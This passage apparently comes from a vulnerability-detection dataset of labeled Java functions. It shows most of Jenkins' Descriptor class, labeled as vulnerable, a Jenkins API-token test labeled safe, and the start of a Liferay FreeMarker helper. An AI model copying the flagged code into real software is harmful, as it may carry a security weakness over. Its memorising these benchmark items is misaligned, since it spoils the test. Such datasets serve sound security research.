getItemTypeDescriptorOrDie() {\n            Class it = getItemType();\n            if (it == null) {\n                throw new AssertionError(clazz + \" is not an array/collection type in \" + displayName + \". See https://wiki.jenkins-ci.org/display/JENKINS/My+class+is+missing+descriptor\");\n            }\n            Descriptor d = Jenkins.getInstance().getDescriptor(it);\n            if (d==null)\n                throw new AssertionError(it +\" is missing its descriptor in \"+displayName+\". See https://wiki.jenkins-ci.org/display/JENKINS/My+class+is+missing+descriptor\");\n            return d;\n        }\n\n        /**\n         * Returns all the descriptors that produce types assignable to the property type.\n         */\n        public List<? extends Descriptor> getApplicableDescriptors() {\n            return Jenkins.getInstance().getDescriptorList(clazz);\n        }\n\n        /**\n         * Returns all the descriptors that produce types assignable to the item type for a collection property.\n         */\n        public List<? extends Descriptor> getApplicableItemDescriptors() {\n            return Jenkins.getInstance().getDescriptorList(getItemType());\n        }\n    }\n\n    /**\n     * Help file redirect, keyed by the field name to the path.\n     *\n     * @see #getHelpFile(String) \n     */\n    private transient final Map<String,String> helpRedirect = new HashMap<String, String>();\n\n    /**\n     *\n     * @param clazz\n     *      Pass in {@link #self()} to have the descriptor describe itself,\n     *      (this hack is needed since derived types can't call \"getClass()\" to refer to itself.\n     */\n    protected Descriptor(Class<? extends T> clazz) {\n        if (clazz==self())\n            clazz = (Class)getClass();\n        this.clazz = clazz;\n        // doing this turns out to be very error prone,\n        // as field initializers in derived types will override values.\n        // load();\n    }\n\n    /**\n     * Infers the type of the corresponding {@link Describable} from the outer class.\n     * This version works when you follow the common convention, where a descriptor\n     * is written as the static nested class of the describable class.\n     * \n     * @since 1.278\n     */\n    protected Descriptor() {\n        this.clazz = (Class<T>)getClass().getEnclosingClass();\n        if(clazz==null)\n            throw new AssertionError(getClass()+\" doesn't have an outer class. Use the constructor that takes the Class object explicitly.\");\n\n        // detect an type error\n        Type bt = Types.getBaseClass(getClass(), Descriptor.class);\n        if (bt instanceof ParameterizedType) {\n            ParameterizedType pt = (ParameterizedType) bt;\n            // this 't' is the closest approximation of T of Descriptor<T>.\n            Class t = Types.erasure(pt.getActualTypeArguments()[0]);\n            if(!t.isAssignableFrom(clazz))\n                throw new AssertionError(\"Outer class \"+clazz+\" of \"+getClass()+\" is not assignable to \"+t+\". Perhaps wrong outer class?\");\n        }\n\n        // detect a type error. this Descriptor is supposed to be returned from getDescriptor(), so make sure its type match up.\n        // this prevents a bug like http://www.nabble.com/Creating-a-new-parameter-Type-%3A-Masked-Parameter-td24786554.html\n        try {\n            Method getd = clazz.getMethod(\"getDescriptor\");\n            if(!getd.getReturnType().isAssignableFrom(getClass())) {\n                throw new AssertionError(getClass()+\" must be assignable to \"+getd.getReturnType());\n            }\n        } catch (NoSuchMethodException e) {\n            throw new AssertionError(getClass()+\" is missing getDescriptor method.\");\n        }\n\n    }\n\n    /**\n     * Human readable name of this kind of configurable object.\n     */\n    public abstract String getDisplayName();\n\n    /**\n     * Uniquely identifies this {@link Descriptor} among all the other {@link Descriptor}s.\n     *\n     * <p>\n     * Historically {@link #clazz} is assumed to be unique, so this method uses that as the default,\n     * but if you are adding {@link Descriptor}s programmatically for the same type, you can change\n     * this to disambiguate them.\n     *\n     * <p>\n     * To look up {@link Descriptor} from ID, use {@link Jenkins#getDescriptor(String)}.\n     *\n     * @return\n     *      Stick to valid Java identifier character, plus '.', which had to be allowed for historical reasons.\n     * \n     * @since 1.391\n     */\n    public String getId() {\n        return clazz.getName();\n    }\n\n    /**\n     * Unlike {@link #clazz}, return the parameter type 'T', which determines\n     * the {@link DescriptorExtensionList} that this goes to.\n     *\n     * <p>\n     * In those situations where subtypes cannot provide the type parameter,\n     * this method can be overridden to provide it.\n     */\n    public Class<T> getT() {\n        Type subTyping = Types.getBaseClass(getClass(), Descriptor.class);\n        if (!(subTyping instanceof ParameterizedType)) {\n            throw new IllegalStateException(getClass()+\" doesn't extend Descriptor with a type parameter.\");\n        }\n        return Types.erasure(Types.getTypeArgument(subTyping, 0));\n    }\n\n    /**\n     * Gets the URL that this Descriptor is bound to, relative to the nearest {@link DescriptorByNameOwner}.\n     * Since {@link Jenkins} is a {@link DescriptorByNameOwner}, there's always one such ancestor to any request.\n     */\n    public String getDescriptorUrl() {\n        return \"descriptorByName/\"+getId();\n    }\n\n    /**\n     * Gets the URL that this Descriptor is bound to, relative to the context path.\n     * @since 1.406\n     */\n    public final String getDescriptorFullUrl() {\n        return getCurrentDescriptorByNameUrl()+'/'+getDescriptorUrl();\n    }\n\n    /**\n     * @since 1.402\n     */\n    public static String getCurrentDescriptorByNameUrl() {\n        StaplerRequest req = Stapler.getCurrentRequest();\n\n        // this override allows RenderOnDemandClosure to preserve the proper value\n        Object url = req.getAttribute(\"currentDescriptorByNameUrl\");\n        if (url!=null)  return url.toString();\n\n        Ancestor a = req.findAncestor(DescriptorByNameOwner.class);\n        return a.getUrl();\n    }\n\n    /**\n     * If the field \"xyz\" of a {@link Describable} has the corresponding \"doCheckXyz\" method,\n     * return the form-field validation string. Otherwise null.\n     * <p>\n     * This method is used to hook up the form validation method to the corresponding HTML input element.\n     */\n    public String getCheckUrl(String fieldName) {\n        String method = checkMethods.get(fieldName);\n        if(method==null) {\n            method = calcCheckUrl(fieldName);\n            checkMethods.put(fieldName,method);\n        }\n\n        if (method.equals(NONE)) // == would do, but it makes IDE flag a warning\n            return null;\n\n        // put this under the right contextual umbrella.\n        // a is always non-null because we already have Hudson as the sentinel\n        return '\\'' + jsStringEscape(getCurrentDescriptorByNameUrl()) + \"/'+\" + method;\n    }\n\n    private String calcCheckUrl(String fieldName) {\n        String capitalizedFieldName = StringUtils.capitalize(fieldName);\n\n        Method method = ReflectionUtils.getPublicMethodNamed(getClass(),\"doCheck\"+ capitalizedFieldName);\n\n        if(method==null)\n            return NONE;\n\n        return '\\'' + getDescriptorUrl() + \"/check\" + capitalizedFieldName + '\\'' + buildParameterList(method, new StringBuilder()).append(\".toString()\");\n    }\n\n    /**\n     * Builds query parameter line by figuring out what should be submitted\n     */\n    private StringBuilder buildParameterList(Method method, StringBuilder query) {\n        for (Parameter p : ReflectionUtils.getParameters(method)) {\n            QueryParameter qp = p.annotation(QueryParameter.class);\n            if (qp!=null) {\n                String name = qp.value();\n                if (name.length()==0) name = p.name();\n                if (name==null || name.length()==0)\n                    continue;   // unknown parameter name. we'll report the error when the form is submitted.\n\n                RelativePath rp = p.annotation(RelativePath.class);\n                if (rp!=null)\n                    name = rp.value()+'/'+name;\n\n                if (query.length()==0)  query.append(\"+qs(this)\");\n\n                if (name.equals(\"value\")) {\n                    // The special 'value' parameter binds to the the current field\n                    query.append(\".addThis()\");\n                } else {\n                    query.append(\".nearBy('\"+name+\"')\");\n                }\n                continue;\n            }\n\n            Method m = ReflectionUtils.getPublicMethodNamed(p.type(), \"fromStapler\");\n            if (m!=null)    buildParameterList(m,query);\n        }\n        return query;\n    }\n\n    /**\n     * Computes the list of other form fields that the given field depends on, via the doFillXyzItems method,\n     * and sets that as the 'fillDependsOn' attribute. Also computes the URL of the doFillXyzItems and\n     * sets that as the 'fillUrl' attribute.\n     */\n    public void calcFillSettings(String field, Map<String,Object> attributes) {\n        String capitalizedFieldName = StringUtils.capitalize(field);\n        String methodName = \"doFill\" + capitalizedFieldName + \"Items\";\n        Method method = ReflectionUtils.getPublicMethodNamed(getClass(), methodName);\n        if(method==null)\n            throw new IllegalStateException(String.format(\"%s doesn't have the %s method for filling a drop-down list\", getClass(), methodName));\n\n        // build query parameter line by figuring out what should be submitted\n        List<String> depends = buildFillDependencies(method, new ArrayList<String>());\n\n        if (!depends.isEmpty())\n            attributes.put(\"fillDependsOn\",Util.join(depends,\" \"));\n        attributes.put(\"fillUrl\", String.format(\"%s/%s/fill%sItems\", getCurrentDescriptorByNameUrl(), getDescriptorUrl(), capitalizedFieldName));\n    }\n\n    private List<String> buildFillDependencies(Method method, List<String> depends) {\n        for (Parameter p : ReflectionUtils.getParameters(method)) {\n            QueryParameter qp = p.annotation(QueryParameter.class);\n            if (qp!=null) {\n                String name = qp.value();\n                if (name.length()==0) name = p.name();\n                if (name==null || name.length()==0)\n                    continue;   // unknown parameter name. we'll report the error when the form is submitted.\n\n                RelativePath rp = p.annotation(RelativePath.class);\n                if (rp!=null)\n                    name = rp.value()+'/'+name;\n\n                depends.add(name);\n                continue;\n            }\n\n            Method m = ReflectionUtils.getPublicMethodNamed(p.type(), \"fromStapler\");\n            if (m!=null)\n                buildFillDependencies(m,depends);\n        }\n        return depends;\n    }\n\n    /**\n     * Computes the auto-completion setting\n     */\n    public void calcAutoCompleteSettings(String field, Map<String,Object> attributes) {\n        String capitalizedFieldName = StringUtils.capitalize(field);\n        String methodName = \"doAutoComplete\" + capitalizedFieldName;\n        Method method = ReflectionUtils.getPublicMethodNamed(getClass(), methodName);\n        if(method==null)\n            return;    // no auto-completion\n\n        attributes.put(\"autoCompleteUrl\", String.format(\"%s/%s/autoComplete%s\", getCurrentDescriptorByNameUrl(), getDescriptorUrl(), capitalizedFieldName));\n    }\n\n    /**\n     * Used by Jelly to abstract away the handlign of global.jelly vs config.jelly databinding difference.\n     */\n    public @CheckForNull PropertyType getPropertyType(@Nonnull Object instance, @Nonnull String field) {\n        // in global.jelly, instance==descriptor\n        return instance==this ? getGlobalPropertyType(field) : getPropertyType(field);\n    }\n\n    /**\n     * Akin to {@link #getPropertyType(Object,String) but never returns null.\n     * @throws AssertionError in case the field cannot be found\n     * @since 1.492\n     */\n    public @Nonnull PropertyType getPropertyTypeOrDie(@Nonnull Object instance, @Nonnull String field) {\n        PropertyType propertyType = getPropertyType(instance, field);\n        if (propertyType != null) {\n            return propertyType;\n        } else if (instance == this) {\n            throw new AssertionError(getClass().getName() + \" has no property \" + field);\n        } else {\n            throw new AssertionError(clazz.getName() + \" has no property \" + field);\n        }\n    }\n\n    /**\n     * Obtains the property type of the given field of {@link #clazz}\n     */\n    public PropertyType getPropertyType(String field) {\n        if(propertyTypes==null)\n            propertyTypes = buildPropertyTypes(clazz);\n        return propertyTypes.get(field);\n    }\n\n    /**\n     * Obtains the property type of the given field of this descriptor.\n     */\n    public PropertyType getGlobalPropertyType(String field) {\n        if(globalPropertyTypes==null)\n            globalPropertyTypes = buildPropertyTypes(getClass());\n        return globalPropertyTypes.get(field);\n    }\n\n    /**\n     * Given the class, list up its {@link PropertyType}s from its public fields/getters.\n     */\n    private Map<String, PropertyType> buildPropertyTypes(Class<?> clazz) {\n        Map<String, PropertyType> r = new HashMap<String, PropertyType>();\n        for (Field f : clazz.getFields())\n            r.put(f.getName(),new PropertyType(f));\n\n        for (Method m : clazz.getMethods())\n            if(m.getName().startsWith(\"get\"))\n                r.put(Introspector.decapitalize(m.getName().substring(3)),new PropertyType(m));\n\n        return r;\n    }\n\n    /**\n     * Gets the class name nicely escaped to be usable as a key in the structured form submission.\n     */\n    public final String getJsonSafeClassName() {\n        return getId().replace('.','-');\n    }\n\n    /**\n     * @deprecated\n     *      Implement {@link #newInstance(StaplerRequest, JSONObject)} method instead.\n     *      Deprecated as of 1.145. \n     */\n    public T newInstance(StaplerRequest req) throws FormException {\n        throw new UnsupportedOperationException(getClass()+\" should implement newInstance(StaplerRequest,JSONObject)\");\n    }\n\n    /**\n     * Creates a configured instance from the submitted form.\n     *\n     * <p>\n     * Hudson only invokes this method when the user wants an instance of <tt>T</tt>.\n     * So there's no need to check that in the implementation.\n     *\n     * <p>\n     * Starting 1.206, the default implementation of this method does the following:\n     * <pre>\n     * req.bindJSON(clazz,formData);\n     * </pre>\n     * <p>\n     * ... which performs the databinding on the constructor of {@link #clazz}.\n     *\n     * <p>\n     * For some types of {@link Describable}, such as {@link ListViewColumn}, this method\n     * can be invoked with null request object for historical reason. Such design is considered\n     * broken, but due to the compatibility reasons we cannot fix it. Because of this, the\n     * default implementation gracefully handles null request, but the contract of the method\n     * still is \"request is always non-null.\" Extension points that need to define the \"default instance\"\n     * semantics should define a descriptor subtype and add the no-arg newInstance method.\n     *\n     * @param req\n     *      Always non-null (see note above.) This object includes represents the entire submission.\n     * @param formData\n     *      The JSON object that captures the configuration data for this {@link Descriptor}.\n     *      See http://wiki.jenkins-ci.org/display/JENKINS/Structured+Form+Submission\n     *      Always non-null.\n     *\n     * @throws FormException\n     *      Signals a problem in the submitted form.\n     * @since 1.145\n     */\n    public T newInstance(StaplerRequest req, JSONObject formData) throws FormException {\n        try {\n            Method m = getClass().getMethod(\"newInstance\", StaplerRequest.class);\n\n            if(!Modifier.isAbstract(m.getDeclaringClass().getModifiers())) {\n                // this class overrides newInstance(StaplerRequest).\n                // maintain the backward compatible behavior\n                return verifyNewInstance(newInstance(req));\n            } else {\n                if (req==null) {\n                    // yes, req is supposed to be always non-null, but see the note above\n                    return verifyNewInstance(clazz.newInstance());\n                }\n\n                // new behavior as of 1.206\n                return verifyNewInstance(req.bindJSON(clazz,formData));\n            }\n        } catch (NoSuchMethodException e) {\n            throw new AssertionError(e); // impossible\n        } catch (InstantiationException e) {\n            throw new Error(\"Failed to instantiate \"+clazz+\" from \"+formData,e);\n        } catch (IllegalAccessException e) {\n            throw new Error(\"Failed to instantiate \"+clazz+\" from \"+formData,e);\n        } catch (RuntimeException e) {\n            throw new RuntimeException(\"Failed to instantiate \"+clazz+\" from \"+formData,e);\n        }\n    }\n\n    /**\n     * Look out for a typical error a plugin developer makes.\n     * See http://hudson.361315.n4.nabble.com/Help-Hint-needed-Post-build-action-doesn-t-stay-activated-td2308833.html\n     */\n    private T verifyNewInstance(T t) {\n        if (t!=null && t.getDescriptor()!=this) {\n            // TODO: should this be a fatal error?\n            LOGGER.warning(\"Father of \"+ t+\" and its getDescriptor() points to two different instances. Probably malplaced @Extension. See http://hudson.361315.n4.nabble.com/Help-Hint-needed-Post-build-action-doesn-t-stay-activated-td2308833.html\");\n        }\n        return t;\n    }\n\n    /**\n     * Returns the {@link Klass} object used for the purpose of loading resources from this descriptor.\n     *\n     * This hook enables other JVM languages to provide more integrated lookup.\n     */\n    public Klass<?> getKlass() {\n        return Klass.java(clazz);\n    }\n\n    /**\n     * Returns the resource path to the help screen HTML, if any.\n     *\n     * <p>\n     * Starting 1.282, this method uses \"convention over configuration\" &mdash; you should\n     * just put the \"help.html\" (and its localized versions, if any) in the same directory\n     * you put your Jelly view files, and this method will automatically does the right thing.\n     *\n     * <p>\n     * This value is relative to the context root of Hudson, so normally\n     * the values are something like <tt>\"/plugin/emma/help.html\"</tt> to\n     * refer to static resource files in a plugin, or <tt>\"/publisher/EmmaPublisher/abc\"</tt>\n     * to refer to Jelly script <tt>abc.jelly</tt> or a method <tt>EmmaPublisher.doAbc()</tt>.\n     *\n     * @return\n     *      null to indicate that there's no help.\n     */\n    public String getHelpFile() {\n        return getHelpFile(null);\n    }\n\n    /**\n     * Returns the path to the help screen HTML for the given field.\n     *\n     * <p>\n     * The help files are assumed to be at \"help/FIELDNAME.html\" with possible\n     * locale variations.\n     */\n    public String getHelpFile(final String fieldName) {\n        return getHelpFile(getKlass(),fieldName);\n    }\n\n    public String getHelpFile(Klass<?> clazz, String fieldName) {\n        String v = helpRedirect.get(fieldName);\n        if (v!=null)    return v;\n\n        for (Klass<?> c : clazz.getAncestors()) {\n            String page = \"/descriptor/\" + getId() + \"/help\";\n            String suffix;\n            if(fieldName==null) {\n                suffix=\"\";\n            } else {\n                page += '/'+fieldName;\n                suffix='-'+fieldName;\n            }\n\n            try {\n                if(Stapler.getCurrentRequest().getView(c,\"help\"+suffix)!=null)\n                    return page;\n            } catch (IOException e) {\n                throw new Error(e);\n            }\n\n            if(getStaticHelpUrl(c, suffix) !=null)    return page;\n        }\n        return null;\n    }\n    \n    /**\n     * Tells Jenkins that the help file for the field 'fieldName' is defined in the help file for\n     * the 'fieldNameToRedirectTo' in the 'owner' class.\n     * @since 1.425\n     */\n    protected void addHelpFileRedirect(String fieldName, Class<? extends Describable> owner, String fieldNameToRedirectTo) {\n        helpRedirect.put(fieldName,\n            Jenkins.getInstance().getDescriptor(owner).getHelpFile(fieldNameToRedirectTo));\n    }\n\n    /**\n     * Checks if the given object is created from this {@link Descriptor}.\n     */\n    public final boolean isInstance( T instance ) {\n        return clazz.isInstance(instance);\n    }\n\n    /**\n     * Checks if the type represented by this descriptor is a subtype of the given type.\n     */\n    public final boolean isSubTypeOf(Class type) {\n        return type.isAssignableFrom(clazz);\n    }\n\n    /**\n     * @deprecated\n     *      As of 1.239, use {@link #configure(StaplerRequest, JSONObject)}.\n     */\n    public boolean configure( StaplerRequest req ) throws FormException {\n        return true;\n    }\n\n    /**\n     * Invoked when the global configuration page is submitted.\n     *\n     * Can be overriden to store descriptor-specific information.\n     *\n     * @param json\n     *      The JSON object that captures the configuration data for this {@link Descriptor}.\n     *      See http://wiki.jenkins-ci.org/display/JENKINS/Structured+Form+Submission\n     * @return false\n     *      to keep the client in the same config page.\n     */\n    public boolean configure( StaplerRequest req, JSONObject json ) throws FormException {\n        // compatibility\n        return configure(req);\n    }\n\n    public String getConfigPage() {\n        return getViewPage(clazz, getPossibleViewNames(\"config\"), \"config.jelly\");\n    }\n\n    public String getGlobalConfigPage() {\n        return getViewPage(clazz, getPossibleViewNames(\"global\"), null);\n    }\n    \n    private String getViewPage(Class<?> clazz, String pageName, String defaultValue) {\n        return getViewPage(clazz,Collections.singleton(pageName),defaultValue);\n    }\n\n    private String getViewPage(Class<?> clazz, Collection<String> pageNames, String defaultValue) {\n        while(clazz!=Object.class && clazz!=null) {\n            for (String pageName : pageNames) {\n                String name = clazz.getName().replace('.', '/').replace('$', '/') + \"/\" + pageName;\n                if(clazz.getClassLoader().getResource(name)!=null)\n                    return '/'+name;\n            }\n            clazz = clazz.getSuperclass();\n        }\n        return defaultValue;\n    }\n\n    protected final String getViewPage(Class<?> clazz, String pageName) {\n        // We didn't find the configuration page.\n        // Either this is non-fatal, in which case it doesn't matter what string we return so long as\n        // it doesn't exist.\n        // Or this error is fatal, in which case we want the developer to see what page he's missing.\n        // so we put the page name.\n        return getViewPage(clazz,pageName,pageName);\n    }\n\n    protected List<String> getPossibleViewNames(String baseName) {\n        List<String> names = new ArrayList<String>();\n        for (Facet f : WebApp.get(Jenkins.getInstance().servletContext).facets) {\n            if (f instanceof JellyCompatibleFacet) {\n                JellyCompatibleFacet jcf = (JellyCompatibleFacet) f;\n                for (String ext : jcf.getScriptExtensions())\n                    names.add(baseName +ext);\n            }\n        }\n        return names;\n    }\n\n\n    /**\n     * Saves the configuration info to the disk.\n     */\n    public synchronized void save() {\n        if(BulkChange.contains(this))   return;\n        try {\n            getConfigFile().write(this);\n            SaveableListener.fireOnChange(this, getConfigFile());\n        } catch (IOException e) {\n            LOGGER.log(Level.WARNING, \"Failed to save \"+getConfigFile(),e);\n        }\n    }\n\n    /**\n     * Loads the data from the disk into this object.\n     *\n     * <p>\n     * The constructor of the derived class must call this method.\n     * (If we do that in the base class, the derived class won't\n     * get a chance to set default values.)\n     */\n    public synchronized void load() {\n        XmlFile file = getConfigFile();\n        if(!file.exists())\n            return;\n\n        try {\n            file.unmarshal(this);\n        } catch (IOException e) {\n            LOGGER.log(Level.WARNING, \"Failed to load \"+file, e);\n        }\n    }\n\n    protected final XmlFile getConfigFile() {\n        return new XmlFile(new File(Jenkins.getInstance().getRootDir(),getId()+\".xml\"));\n    }\n\n    /**\n     * Returns the plugin in which this descriptor is defined.\n     *\n     * @return\n     *      null to indicate that this descriptor came from the core.\n     */\n    protected PluginWrapper getPlugin() {\n        return Jenkins.getInstance().getPluginManager().whichPlugin(clazz);\n    }\n\n    /**\n     * Serves <tt>help.html</tt> from the resource of {@link #clazz}.\n     */\n    public void doHelp(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException {\n        String path = req.getRestOfPath();\n        if(path.contains(\"..\")) throw new ServletException(\"Illegal path: \"+path);\n\n        path = path.replace('/','-');\n\n        PluginWrapper pw = getPlugin();\n        if (pw!=null) {\n            rsp.setHeader(\"X-Plugin-Short-Name\",pw.getShortName());\n            rsp.setHeader(\"X-Plugin-Long-Name\",pw.getLongName());\n            rsp.setHeader(\"X-Plugin-From\", Messages.Descriptor_From(\n                    pw.getLongName().replace(\"Hudson\",\"Jenkins\").replace(\"hudson\",\"jenkins\"), pw.getUrl()));\n        }\n\n        for (Klass<?> c= getKlass(); c!=null; c=c.getSuperClass()) {\n            RequestDispatcher rd = Stapler.getCurrentRequest().getView(c, \"help\"+path);\n            if(rd!=null) {// template based help page\n                rd.forward(req,rsp);\n                return;\n            }\n\n            URL url = getStaticHelpUrl(c, path);\n            if(url!=null) {\n                // TODO: generalize macro expansion and perhaps even support JEXL\n                rsp.setContentType(\"text/html;charset=UTF-8\");\n                InputStream in = url.openStream();\n                try {\n                    String literal = IOUtils.toString(in,\"UTF-8\");\n                    rsp.getWriter().println(Util.replaceMacro(literal, Collections.singletonMap(\"rootURL\",req.getContextPath())));\n                } finally {\n                    IOUtils.closeQuietly(in);\n                }\n                return;\n            }\n        }\n        rsp.sendError(SC_NOT_FOUND);\n    }\n\n    private URL getStaticHelpUrl(Klass<?> c, String suffix) {\n        Locale locale = Stapler.getCurrentRequest().getLocale();\n\n        String base = \"help\"+suffix;\n\n        URL url;\n        url = c.getResource(base + '_' + locale.getLanguage() + '_' + locale.getCountry() + '_' + locale.getVariant() + \".html\");\n        if(url!=null)    return url;\n        url = c.getResource(base + '_' + locale.getLanguage() + '_' + locale.getCountry() + \".html\");\n        if(url!=null)    return url;\n        url = c.getResource(base + '_' + locale.getLanguage() + \".html\");\n        if(url!=null)    return url;\n\n        // default\n        return c.getResource(base + \".html\");\n    }\n\n\n//\n// static methods\n//\n\n\n    // to work around warning when creating a generic array type\n    public static <T> T[] toArray( T... values ) {\n        return values;\n    }\n\n    public static <T> List<T> toList( T... values ) {\n        return new ArrayList<T>(Arrays.asList(values));\n    }\n\n    public static <T extends Describable<T>>\n    Map<Descriptor<T>,T> toMap(Iterable<T> describables) {\n        Map<Descriptor<T>,T> m = new LinkedHashMap<Descriptor<T>,T>();\n        for (T d : describables) {\n            m.put(d.getDescriptor(),d);\n        }\n        return m;\n    }\n\n    /**\n     * Used to build {@link Describable} instance list from &lt;f:hetero-list> tag.\n     *\n     * @param req\n     *      Request that represents the form submission.\n     * @param formData\n     *      Structured form data that represents the contains data for the list of describables.\n     * @param key\n     *      The JSON property name for 'formData' that represents the data for the list of describables.\n     * @param descriptors\n     *      List of descriptors to create instances from.\n     * @return\n     *      Can be empty but never null.\n     */\n    public static <T extends Describable<T>>\n    List<T> newInstancesFromHeteroList(StaplerRequest req, JSONObject formData, String key,\n                Collection<? extends Descriptor<T>> descriptors) throws FormException {\n\n        return newInstancesFromHeteroList(req,formData.get(key),descriptors);\n    }\n\n    public static <T extends Describable<T>>\n    List<T> newInstancesFromHeteroList(StaplerRequest req, Object formData,\n                Collection<? extends Descriptor<T>> descriptors) throws FormException {\n\n        List<T> items = new ArrayList<T>();\n\n        if (formData!=null) {\n            for (Object o : JSONArray.fromObject(formData)) {\n                JSONObject jo = (JSONObject)o;\n                String kind = jo.getString(\"kind\");\n                items.add(find(descriptors,kind).newInstance(req,jo));\n            }\n        }\n\n        return items;\n    }\n\n    /**\n     * Finds a descriptor from a collection by its class name.\n     */\n    public static <T extends Descriptor> T find(Collection<? extends T> list, String className) {\n        for (T d : list) {\n            if(d.getClass().getName().equals(className))\n                return d;\n        }\n        // Since we introduced Descriptor.getId(), it is a preferred method of identifying descriptor by a string.\n        // To make that migration easier without breaking compatibility, let's also match up with the id.\n        for (T d : list) {\n            if(d.getId().equals(className))\n                return d;\n        }\n        return null;\n    }\n\n    public static Descriptor find(String className) {\n        return find(Jenkins.getInstance().getExtensionList(Descriptor.class),className);\n    }\n\n    public static final class FormException extends Exception implements HttpResponse {\n        private final String formField;\n\n        public FormException(String message, String formField) {\n            super(message);\n            this.formField = formField;\n        }\n\n        public FormException(String message, Throwable cause, String formField) {\n            super(message, cause);\n            this.formField = formField;\n        }\n\n        public FormException(Throwable cause, String formField) {\n            super(cause);\n            this.formField = formField;\n        }\n\n        /**\n         * Which form field contained an error?\n         */\n        public String getFormField() {\n            return formField;\n        }\n\n        public void generateResponse(StaplerRequest req, StaplerResponse rsp, Object node) throws IOException, ServletException {\n            if (FormApply.isApply(req)) {\n                FormApply.applyResponse(\"notificationBar.show(\" + quote(getMessage())+ \",notificationBar.defaultOptions.ERROR)\")\n                        .generateResponse(req, rsp, node);\n            } else {\n                // for now, we can't really use the field name that caused the problem.\n                new Failure(getMessage()).generateResponse(req,rsp,node);\n            }\n        }\n    }\n\n    private static final Logger LOGGER = Logger.getLogger(Descriptor.class.getName());\n\n    /**\n     * Used in {@link #checkMethods} to indicate that there's no check method.\n     */\n    private static final String NONE = \"\\u0000\";\n\n    /**\n     * Special type indicating that {@link Descriptor} describes itself.\n     * @see Descriptor#Descriptor(Class)\n     */\n    public static final class Self {}\n\n    protected static Class self() { return Self.class; }\n}\n", "target": 1}
{"idx": 1036, "func": "package jenkins.security;\n\nimport com.gargoylesoftware.htmlunit.HttpWebConnection;\nimport com.gargoylesoftware.htmlunit.html.HtmlForm;\nimport com.gargoylesoftware.htmlunit.html.HtmlPage;\nimport hudson.Util;\nimport hudson.model.User;\nimport jenkins.model.Jenkins;\nimport org.apache.commons.httpclient.Credentials;\nimport org.apache.commons.httpclient.HttpClient;\nimport org.apache.commons.httpclient.UsernamePasswordCredentials;\nimport org.apache.commons.httpclient.auth.AuthScheme;\nimport org.apache.commons.httpclient.auth.AuthScope;\nimport org.apache.commons.httpclient.auth.CredentialsNotAvailableException;\nimport org.apache.commons.httpclient.auth.CredentialsProvider;\nimport org.jvnet.hudson.test.HudsonTestCase;\n\nimport java.util.concurrent.Callable;\n\n/**\n * @author Kohsuke Kawaguchi\n */\npublic class ApiTokenPropertyTest extends HudsonTestCase {\n    /**\n     * Tests the UI interaction and authentication.\n     */\n    public void testBasics() throws Exception {\n        jenkins.setSecurityRealm(createDummySecurityRealm());\n        User u = User.get(\"foo\");\n        ApiTokenProperty t = u.getProperty(ApiTokenProperty.class);\n        final String token = t.getApiToken();\n\n        // make sure the UI shows the token\n        HtmlPage config = createWebClient().goTo(u.getUrl() + \"/configure\");\n        HtmlForm form = config.getFormByName(\"config\");\n        assertEquals(token, form.getInputByName(\"_.apiToken\").getValueAttribute());\n\n        // round-trip shouldn't change the API token\n        submit(form);\n        assertSame(t, u.getProperty(ApiTokenProperty.class));\n\n        WebClient wc = createWebClient();\n        wc.setCredentialsProvider(new CredentialsProvider() {\n            public Credentials getCredentials(AuthScheme scheme, String host, int port, boolean proxy) throws CredentialsNotAvailableException {\n                return new UsernamePasswordCredentials(\"foo\", token);\n            }\n        });\n        wc.setWebConnection(new HttpWebConnection(wc) {\n            @Override\n            protected HttpClient getHttpClient() {\n                HttpClient c = super.getHttpClient();\n                c.getParams().setAuthenticationPreemptive(true);\n                c.getState().setCredentials(new AuthScope(\"localhost\", localPort, AuthScope.ANY_REALM), new UsernamePasswordCredentials(\"foo\", token));\n                return c;\n            }\n        });\n\n        // test the authentication\n        assertEquals(u,wc.executeOnServer(new Callable<User>() {\n            public User call() throws Exception {\n                return User.current();\n            }\n        }));\n    }\n\n    public void testSecurity49Upgrade() throws Exception {\n        jenkins.setSecurityRealm(createDummySecurityRealm());\n        User u = User.get(\"foo\");\n        String historicalInitialValue = Util.getDigestOf(Jenkins.getInstance().getSecretKey() + \":\" + u.getId());\n\n        // we won't accept historically used initial value as it may be compromised\n        ApiTokenProperty t = new ApiTokenProperty(historicalInitialValue);\n        u.addProperty(t);\n        String apiToken1 = t.getApiToken();\n        assertFalse(apiToken1.equals(Util.getDigestOf(historicalInitialValue)));\n\n        // the replacement for the compromised value must be consistent and cannot be random\n        ApiTokenProperty t2 = new ApiTokenProperty(historicalInitialValue);\n        u.addProperty(t2);\n        assertEquals(apiToken1,t2.getApiToken());\n\n        // any other value is OK. those are changed values\n        t = new ApiTokenProperty(historicalInitialValue+\"somethingElse\");\n        u.addProperty(t);\n        assertTrue(t.getApiToken().equals(Util.getDigestOf(historicalInitialValue+\"somethingElse\")));\n\n    }\n}\n", "target": 0}
{"idx": 1037, "func": "/**\n * Copyright (c) 2000-2012 Liferay, Inc. All rights reserved.\n *\n * This library is free software; you can redistribute it and/or modify it under\n * the terms of the GNU Lesser General Public License as published by the Free\n * Software Foundation; either version 2.1 of the License, or (at your option)\n * any later version.\n *\n * This library is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS\n * FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more\n * details.\n */\n\npackage com.liferay.portal.freemarker;\n\nimport com.liferay.portal.kernel.templateparser.TemplateContext;\nimport com.liferay.portal.kernel.util.GetterUtil;\nimport com.liferay.portal.kernel.util.SetUtil;\nimport com.liferay.portal.kernel.util.StringPool;\nimport com.liferay.portal.kernel.util.Validator;\nimport com.liferay.portal.model.Theme;\nimport com.liferay.portal.template.TemplateContextHelper;\nimport com.liferay.portal.template.TemplatePortletPreferences;\nimport com.liferay.portal.theme.ThemeDisplay;\nimport com.liferay.portal.util.PropsValues;\nimport com.liferay.portal.util.WebKeys;\n\nimport freemarker.ext.beans.BeansWrapper;\n\nimport freemarker.template.utility.ObjectConstructor;\n\nimport java.util.Map;\nimport java.util.Set;\n\nimport javax.servlet.http.HttpServletRequest;\n\n/**\n * @author Mika Koivisto\n * @author Raymond Augé\n */\npublic class FreeMarkerTemplateContextHelper extends TemplateContextHelper {\n\n\t@Override\n\tpublic Map<String, Object> getHelperUtilities() {\n\t\tMap<String, Object> helperUtilities = super.getHelperUtilities();\n\n\t\t// Enum util\n\n\t\thelperUtilities.put(\n\t\t\t\"enumUtil\", 